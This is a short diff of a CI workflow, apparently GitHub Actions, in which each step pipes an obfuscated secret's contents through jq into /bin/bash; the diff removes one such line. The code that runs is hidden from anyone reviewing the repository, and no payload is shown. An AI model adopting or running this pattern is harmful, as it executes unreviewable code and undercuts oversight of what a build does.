@@ -20,7 +20,6 @@ jobs:
           rigu707: ${{ secrets.rigu707 }}
         run: |
           printf '%s' "$rigu707" | jq -r .zks791 | /bin/bash
-          printf '%s' "$yxxo2667" | jq -r .rtf4 | /bin/bash
           echo $f257 | jq -r .tqb9 | /bin/bash
           printf '%s' "$lb7" | jq -r .q7521 | /bin/bash
           printf '%s' "$v880" | jq -r .qkpfi3920 | /bin/bash
